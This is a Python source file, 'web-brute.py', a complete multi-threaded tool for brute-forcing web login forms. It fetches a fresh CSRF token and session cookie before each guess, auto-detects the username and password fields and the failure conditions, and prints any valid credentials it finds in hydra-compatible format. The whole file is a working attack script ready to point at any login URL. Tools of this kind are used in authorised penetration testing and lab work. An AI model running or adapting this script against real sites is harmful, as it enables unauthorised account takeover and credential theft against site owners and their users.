#!/usr/bin/env python3
"""
web-brute.py — Web form brute force with CSRF token support

Unlike hydra's http-post-form, this script:
1. Fetches the login page first to obtain CSRF tokens and session cookies
2. Submits the form with proper tokens and cookies
3. Follows redirects and checks the final page content
4. Supports custom fail/success conditions

Usage:
  web-brute.py <target_url> -L <users_file> -P <pass_file> [options]

Options:
  -L, --users     User list file (required)
  -P, --pass      Password list file (required)
  -l, --user      Single username
  -p, --passw     Single password
  --form-action   Form action URL (default: auto-detect from page)
  --user-field    Username form field name (default: username)
  --pass-field    Password form field name (default: password)
  --fail-string   String that appears ONLY on failed login page (default: auto-detect)
  --success-string String that appears ONLY on successful login page
  --csrf-field    CSRF token field name (default: auto-detect)
  --max-time      Maximum time in seconds (default: 120)
  --threads       Concurrent threads (default: 4)

Output format (compatible with hydra):
  [port][service] host: <ip>   login: <user>   password: <pass>
"""

import argparse
import re
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

try:
    import requests
except ImportError:
    print("[ERROR] Python requests library not installed", file=sys.stderr)
    sys.exit(1)


def read_wordlist(path):
    """Read a wordlist file, return list of non-empty stripped lines."""
    items = []
    try:
        with open(path, 'r', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    items.append(line)
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {path}", file=sys.stderr)
        sys.exit(1)
    return items


def detect_login_form(session, url, timeout=10):
    """Fetch the login page and detect form fields and CSRF token."""
    try:
        resp = session.get(url, timeout=timeout, allow_redirects=True)
    except requests.RequestException as e:
        print(f"[ERROR] Cannot fetch login page: {e}", file=sys.stderr)
        return None

    html = resp.text

    # Detect form action
    form_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    form_action = form_match.group(1) if form_match else None

    # Detect CSRF token field (common names)
    csrf_field = None
    csrf_value = None
    for name in ['user_token', 'csrf_token', 'csrfmiddlewaretoken',
                  '_token', 'authenticity_token', 'csrf', 'token']:
        match = re.search(
            rf'<input[^>]*name=["\']({name})["\'][^>]*value=["\']([^"\']+)["\']',
            html, re.IGNORECASE
        )
        if not match:
            match = re.search(
                rf'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']({name})["\']',
                html, re.IGNORECASE
            )
            if match:
                csrf_field = match.group(2)
                csrf_value = match.group(1)
        else:
            csrf_field = match.group(1)
            csrf_value = match.group(2)
        if csrf_field:
            break

    # Detect username and password field names
    # Look for <input> fields specifically (not <button> or submit inputs)
    user_field = 'username'
    pass_field = 'password'

    # Find all input fields (exclude hidden, submit, button types)
    input_fields = re.findall(
        r'<input[^>]*type=["\'](?!(?:hidden|submit|button|reset|image))[^"\']*["\'][^>]*name=["\'](\w+)["\']',
        html, re.IGNORECASE
    )
    # Also check inputs without explicit type (default is text)
    input_fields += re.findall(
        r'<input(?![^>]*type=["\'])[^>]*name=["\'](\w+)["\']',
        html, re.IGNORECASE
    )

    for field in input_fields:
        fl = field.lower()
        if 'pass' in fl or 'pwd' in fl:
            pass_field = field
        elif 'user' in fl or 'login' in fl or 'email' in fl or 'account' in fl:
            user_field = field

    # Detect fail condition: look for common error messages in the page
    # If none found, use the presence of the login form as fail condition
    fail_string = None
    for indicator in ['incorrect', 'invalid', 'wrong', 'failed', 'error',
                       'denied', 'not match', 'does not exist', '登录失败',
                       '用户名或密码错误', '认证失败']:
        if indicator in html.lower():
            fail_string = indicator
            break

    # If no error message found, use the login form itself as fail indicator
    if not fail_string:
        # The login form's username input only appears on the LOGIN page
        if f'name="{user_field}"' in html:
            fail_string = f'name="{user_field}"'

    return {
        'form_action': form_action,
        'csrf_field': csrf_field,
        'csrf_value': csrf_value,
        'user_field': user_field,
        'pass_field': pass_field,
        'fail_string': fail_string,
        'cookies': dict(resp.cookies),
        'page_html': html,
    }


def attempt_login(session, target_url, username, password, form_info, timeout=10):
    """
    Attempt a single login. Returns (success, detail) tuple.
    Handles CSRF by fetching a fresh token for each attempt.
    """
    try:
        # Step 1: GET login page to get fresh CSRF token and session
        resp = session.get(target_url, timeout=timeout, allow_redirects=True)
        html = resp.text

        # Extract CSRF token from the fresh page
        csrf_value = None
        if form_info['csrf_field']:
            match = re.search(
                rf'name=["\']({form_info["csrf_field"]})["\'][^>]*value=["\']([^"\']+)["\']',
                html, re.IGNORECASE
            )
            if not match:
                match = re.search(
                    rf'value=["\']([^"\']+)["\'][^>]*name=["\']({form_info["csrf_field"]})["\']',
                    html, re.IGNORECASE
                )
                if match:
                    csrf_value = match.group(1)
            else:
                csrf_value = match.group(2)

        # Step 2: Build form data
        form_data = {
            form_info['user_field']: username,
            form_info['pass_field']: password,
        }
        # Add any submit button
        for btn_name in ['Login', 'login', 'Submit', 'submit', 'signin']:
            if f'name="{btn_name}"' in html or f"name='{btn_name}'" in html:
                form_data[btn_name] = btn_name.capitalize()
                break
        # Add CSRF token
        if form_info['csrf_field'] and csrf_value:
            form_data[form_info['csrf_field']] = csrf_value

        # Step 3: POST the form
        action_url = target_url
        if form_info['form_action']:
            action_url = urljoin(target_url, form_info['form_action'])

        post_resp = session.post(
            action_url,
            data=form_data,
            timeout=timeout,
            allow_redirects=True,
        )

        # Step 4: Check result
        result_html = post_resp.text.lower()
        final_url = post_resp.url

        # If we have a fail string, check if it appears in the response
        if form_info['fail_string']:
            if form_info['fail_string'].lower() in result_html:
                return False, "fail string matched"

        # If we have a success string, check for it
        if form_info.get('success_string'):
            if form_info['success_string'].lower() in result_html:
                return True, "success string matched"

        # Heuristic: if the final URL is different from the login URL,
        # and doesn't contain "login", it's likely a success
        login_path = urlparse(target_url).path.lower()
        final_path = urlparse(final_url).path.lower()
        if final_path != login_path and 'login' not in final_path:
            return True, f"redirected to {final_url}"

        # Heuristic: if the login form is NOT present in the final page, it's success
        if form_info['user_field'] and f'name="{form_info["user_field"]}"' not in post_resp.text:
            return True, "login form not present after submission"

        return False, "login form still present"

    except requests.RequestException as e:
        return False, f"request error: {e}"


def main():
    parser = argparse.ArgumentParser(description='Web form brute force with CSRF support')
    parser.add_argument('target', help='Target URL (e.g., http://192.168.1.1/login.php)')
    parser.add_argument('-L', '--users', help='User list file')
    parser.add_argument('-P', '--passlist', help='Password list file')
    parser.add_argument('-l', '--user', help='Single username')
    parser.add_argument('-p', '--password', help='Single password')
    parser.add_argument('--form-action', help='Form action URL')
    parser.add_argument('--user-field', help='Username field name')
    parser.add_argument('--pass-field', help='Password field name')
    parser.add_argument('--fail-string', help='String indicating failed login')
    parser.add_argument('--success-string', help='String indicating successful login')
    parser.add_argument('--csrf-field', help='CSRF token field name')
    parser.add_argument('--max-time', type=int, default=120, help='Max time in seconds')
    parser.add_argument('--threads', type=int, default=4, help='Concurrent threads')
    args = parser.parse_args()

    # Build user and password lists
    users = []
    passwords = []
    if args.users:
        users = read_wordlist(args.users)
    elif args.user:
        users = [args.user]
    if args.passlist:
        passwords = read_wordlist(args.passlist)
    elif args.password:
        passwords = [args.password]

    if not users or not passwords:
        print("[ERROR] No users or passwords provided", file=sys.stderr)
        sys.exit(1)

    total = len(users) * len(passwords)
    print(f"[INFO] {len(users)} users x {len(passwords)} passwords = {total} attempts")

    # Detect login form
    session = requests.Session()
    form_info = detect_login_form(session, args.target)
    if not form_info:
        sys.exit(1)

    print(f"[INFO] Form action: {form_info['form_action'] or args.target}")
    print(f"[INFO] User field: {form_info['user_field']}")
    print(f"[INFO] Pass field: {form_info['pass_field']}")
    print(f"[INFO] CSRF field: {form_info['csrf_field'] or 'none detected'}")
    print(f"[INFO] Fail condition: {form_info['fail_string'] or 'none (will use heuristic)'}")

    # Override with CLI args
    if args.form_action: form_info['form_action'] = args.form_action
    if args.user_field: form_info['user_field'] = args.user_field
    if args.pass_field: form_info['pass_field'] = args.pass_field
    if args.fail_string: form_info['fail_string'] = args.fail_string
    if args.success_string: form_info['success_string'] = args.success_string
    if args.csrf_field: form_info['csrf_field'] = args.csrf_field

    # Brute force
    found = []
    tried = 0
    lock = threading.Lock()
    start_time = time.time()

    def try_login(username, password):
        nonlocal tried
        s = requests.Session()
        success, detail = attempt_login(s, args.target, username, password, form_info)
        with lock:
            tried += 1
        if success:
            port = urlparse(args.target).port or 80
            result = f"[{port}][http-post-form] host: {urlparse(args.target).hostname}   login: {username}   password: {password}"
            with lock:
                found.append((username, password))
                print(result)
            return True
        return False

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {}
        for u in users:
            for p in passwords:
                if time.time() - start_time > args.max_time:
                    print(f"[WARNING] Time limit ({args.max_time}s) reached", file=sys.stderr)
                    break
                futures[executor.submit(try_login, u, p)] = (u, p)
            else:
                continue
            break

        for future in as_completed(futures):
            future.result()  # consume results

    elapsed = time.time() - start_time
    print(f"[INFO] {tried}/{total} attempts in {elapsed:.1f}s, {len(found)} valid credentials found")


if __name__ == '__main__':
    main()
